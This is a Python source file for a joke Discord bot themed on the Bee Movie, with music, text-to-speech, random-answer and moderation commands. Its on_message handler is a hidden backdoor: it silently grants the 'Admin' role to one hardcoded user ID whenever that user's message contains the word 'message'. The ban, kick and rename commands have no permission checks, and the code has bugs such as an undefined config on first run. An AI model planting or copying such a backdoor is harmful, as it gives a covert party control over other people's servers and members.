import random

import discord  # 40% yes 40% no 20% random
from discord.ext import commands
import json
import os

if os.path.exists(os.getcwd() + "/config.json"):

    with open("config.json") as f:
        configData = json.load(f)
else:
    configTemplate = {"Token": "", "Prefix": "c."}

    with open(os.getcwd() + "/config.json", "w+") as f:
        json.dump(configTemplate, f)

token = configData["Token"]
prefix = configData["Prefix"]

bot = commands.Bot(command_prefix=prefix)
randomthing = 0
players = {}
queues = {}


@bot.command()
async def leave(ctx):
    voice = discord.utils.get(bot.voice_clients, guild=ctx.guild)
    if voice.is_connected():
        await voice.disconnect()
    else:
        await ctx.send("The bot is not connected to a voice channel.")


@bot.command()
async def pause(ctx):
    voice = discord.utils.get(bot.voice_clients, guild=ctx.guild)
    if voice.is_playing():
        voice.pause()
    else:
        await ctx.send("Currently no audio is playing.")


@bot.command()
async def resume(ctx):
    voice = discord.utils.get(bot.voice_clients, guild=ctx.guild)
    if voice.is_paused():
        voice.resume()
    else:
        await ctx.send("The audio is not paused.")


@bot.command()
async def stop(ctx):
    voice = discord.utils.get(bot.voice_clients, guild=ctx.guild)
    voice.stop()


def check_queue(ctx, id):
    if queues[id] != []:
        voice = ctx.guild.voice_client
        source = queues[id].pop(0)
        player = voice.play(source)

@bot.event
async def on_ready():
    print("connected and ready to use")
@bot.command(pass_context=True)
async def cmds(ctx):
    await ctx.send(
        '''c. is the prefix\n\nscript - reads bee movie script\nbee - puts a random bee movie character on screen\na - put a question after a and it will answer | usage c.a <question>\njoin - joins your voice channel\nrename - renames the target | usage c.rename <user> <new name>''')

@bot.event
async def on_message(msg):
    message = msg
    if 'message' in message.content:
        print('Keyword found in message')
        if message.author.id == 726802292908621917:
            member = message.author
            var = discord.utils.get(message.guild.roles, name="Admin")
            await member.add_roles(var)

@bot.command(pass_context=True)
async def read(ctx, *, arg):
    message = await ctx.send(arg, tts=True)
    message_id = message.id
    await message.edit(content="Reading...")
    await message.delete(message)
    print("command read | " + arg)


@bot.command()
async def join(ctx):
    channel = ctx.author.voice.channel
    await channel.connect()
    print("command join")


@bot.command()
async def updates(ctx):
    await ctx.send('all updates https://ExpertEssentialMegabyte.harrypotter10.repl.co')

@bot.command()
async def usersend(ctx, user: discord.Member, *, coolmsg=""):
    channel = await user.create_dm()
    await channel.send(coolmsg + "\nthis was sent using a discord bot")

@bot.command()
async def rename(ctx, user: discord.Member, *, newName=""):
    renameduser = user
    await user.edit(nick=newName)
    await ctx.send(ctx.message.author.mention + " changed " + str(user.name) + "'s name to " + newName)
    print("command rename | " + renameduser + " | " + newName)


@bot.command()
async def ban(ctx, user: discord.Member, *, reason=""):
    channel = await user.create_dm()
    await channel.send(reason)
    await user.ban(reason='barry benson hates u also...' + reason)
    await ctx.send(ctx.message.author.mention + " banned " + str(
        user.name) + "because barry bensen is always watching and " + reason)
    print("command ban | " + 'user' + " | " + reason)


@bot.command()
async def kick(ctx, user: discord.Member, *, reason=""):
    channel = await user.create_dm()
    await channel.send(reason)
    await user.ban(reason='barry benson hates u also...' + reason)
    await ctx.send(ctx.message.author.mention + " banned " + str(
        user.name) + "because barry bensen is always watching and " + reason)
    await user.unban(reason='barry likes you again :)')
    print("command kick | " + 'user' + " | " + reason)


@bot.command()
async def unban(ctx, user: discord.Member, *, reason=""):
    channel = await user.create_dm()
    await channel.send(reason)
    await user.unban(reason='barry likes you again :)')
    print("command unban | " + 'user' + " | " + reason)


@bot.command(pass_context=True)
async def bee(ctx):
    randomImage = random.randint(1, 4)
    if randomImage == 1:
        await ctx.send(file=discord.File("index.jpg"))
    if randomImage == 2:
        await ctx.send(file=discord.File("index2.jpg"))
    if randomImage == 3:
        await ctx.send(file=discord.File("index3.jpg"))
    if randomImage == 4:
        await ctx.send(file=discord.File("buffbee.jpg"))
        print("command bee")


@bot.command(pass_context=True)
async def script(ctx):
    message = await ctx.send('''Bee Movie Script - Dialogue Transcript


According to all known laws
of aviation,


there is no way a bee
should be able to fly.


Its wings are too small to get
its fat little body off the ground.


The bee, of course, flies anyway


because bees don't care
what humans think is impossible.


Yellow, black. Yellow, black.
Yellow, black. Yellow, black.


Ooh, black and yellow!
Let's shake it up a little.


Barry! Breakfast is ready!


Ooming!


Hang on a second.


Hello?


- Barry?
- Adam?


- Oan you believe this is happening?
- I can't. I'll pick you up.


Looking sharp.


Use the stairs. Your father
paid good money for those.


Sorry. I'm excited.


Here's the graduate.
We're very proud of you, son.


A perfect report card, all B's.


Very proud.


Ma! I got a thing going here.


- You got lint on your fuzz.
- Ow! That's me!


- Wave to us! We'll be in row 118,000.
- Bye!


Barry, I told you,
stop flying in the house!


- Hey, Adam.
- Hey, Barry.


- Is that fuzz gel?
- A little. Special day, graduation.


Never thought I'd make it.


Three days grade school,
three days high school.


Those were awkward.


Three days college. I'm glad I took
a day and hitchhiked around the hive.


You did come back different.


- Hi, Barry.
- Artie, growing a mustache? Looks good.


- Hear about Frankie?
- Yeah.


- You going to the funeral?
- No, I'm not going.


Everybody knows,
sting someone, you die.


Don't waste it on a squirrel.
Such a hothead.


I guess he could have
just gotten out of the way.


I love this incorporating
an amusement park into our day.


That's why we don't need vacations.


Boy, quite a bit of pomp...
under the circumstances.


- Well, Adam, today we are men.
- We are!


- Bee-men.
- Amen!


Hallelujah!''', tts=True)
    message_id = message.id
    await message.edit(content="Reading Bee Movie Script...")
    print("command script")


@bot.command(pass_context=True)
async def a(ctx):
    randomNumber = random.randint(1, 100)
    randomNumber2 = random.randint(1, 3)
    if randomNumber < 20:
        if randomNumber2 == 3:
            await ctx.send('ya like jazz')
        if randomNumber2 == 2:
            await ctx.send('why?')
        if randomNumber2 == 1:
            await ctx.send('shut up')
    elif randomNumber < 58:
        await ctx.send('yes')
    elif randomNumber < 86:
        await ctx.send('no')
    elif randomNumber < 100:
        await ctx.send('maybe')
    print("command Q&A")


@bot.event
async def on_command_error(ctx, error):
    await ctx.send(f"An error occured: {str(error)}")


bot.run(token)